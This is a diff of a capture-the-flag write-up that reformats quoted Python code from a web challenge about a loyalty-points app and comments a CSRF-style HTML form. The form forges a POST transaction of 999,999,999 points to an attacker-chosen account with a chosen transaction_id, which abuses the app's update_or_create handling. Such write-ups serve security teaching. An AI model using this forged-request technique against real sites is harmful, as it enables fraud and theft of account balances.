@@ -89,11 +89,11 @@ The part that's most interesting to us is `problemWords` which if it is a url st
 Now that we have a general idea of the challenge, I like to work backwards from the solution/flag. We need to call the `delete-account-and-get-flag` action which only works if we have balance 999999999 and we are not the manager user.
 ```js
 case 'delete-account-and-get-flag':
-                if current_user.balance >= 999_999_999 and not current_user.is_manager and not current_user.is_admin:
-                    current_user.remove()
-                    db.session.commit()
-                    flash('midnight{********REDACTED********}', 'success')
-                return redirect('/')
+    if current_user.balance >= 999_999_999 and not current_user.is_manager and not current_user.is_admin:
+        current_user.remove()
+        db.session.commit()
+        flash('midnight{********REDACTED********}', 'success')
+    return redirect('/')
 ```
 
 
@@ -101,31 +101,31 @@ New users only have 10LP and we need to find a way to increase that. Since the m
 
 ```js
 case 'create-transaction':
-                sender = current_user.id
-                recipient_name = request.form.get('recipient')
-                if recipient_name:
-                    if recipient_name != current_user.username:
-                        recipient = User.query.filter_by(username=recipient_name).first()
-                        if recipient:
-                            amount = int(request.form.get('amount'))
-                            if amount > 0:
-                                form_data = dict(request.form)
-                                form_data['amount'] = amount
-                                del form_data['recipient']
-                                form_data['recipient_id'] = recipient.id
-                                transaction = Transaction.update_or_create(current_user.id, form_data)
-                                if transaction:
-                                    flash('Transaction has been successfully created and will be processed shortly',
-                                          'success')
-                            else:
-                                flash('Invalid amount', 'danger')
-                        else:
-                            flash('Recipient not found', 'danger')
-                    else:
-                        flash('You can\'t send points to yourself', 'danger')
+    sender = current_user.id
+    recipient_name = request.form.get('recipient')
+    if recipient_name:
+        if recipient_name != current_user.username:
+            recipient = User.query.filter_by(username=recipient_name).first()
+            if recipient:
+                amount = int(request.form.get('amount'))
+                if amount > 0:
+                    form_data = dict(request.form)
+                    form_data['amount'] = amount
+                    del form_data['recipient']
+                    form_data['recipient_id'] = recipient.id
+                    transaction = Transaction.update_or_create(current_user.id, form_data)
+                    if transaction:
+                        flash('Transaction has been successfully created and will be processed shortly',
+                                'success')
                 else:
-                    flash('Enter a recipient name', 'danger')
-                return redirect('/?action=transactions-list')
+                    flash('Invalid amount', 'danger')
+            else:
+                flash('Recipient not found', 'danger')
+        else:
+            flash('You can\'t send points to yourself', 'danger')
+    else:
+        flash('Enter a recipient name', 'danger')
+    return redirect('/?action=transactions-list')
 ```
 It takes the recipient parameter from request.form which is POST only, hence the report page we saw earlier cannot be used to send a transaction by itself as it only does get request. That is the **first issue** we have to solve.
 
@@ -257,7 +257,7 @@ Combining this with the first stage exploit, we get the final solution.
     <form id="notcool" action="http://web:8000/?action=create-transaction" method="post">
       <input type="text" name="recipient" value="alfinalfin">
       <input type="text" name="amount" value="999999999">
-      <input type="text" name="transaction_id" value="11">
+      <input type="text" name="transaction_id" value="11"> <!-- Change transaction id -->
     </form>
 
     <script defer>
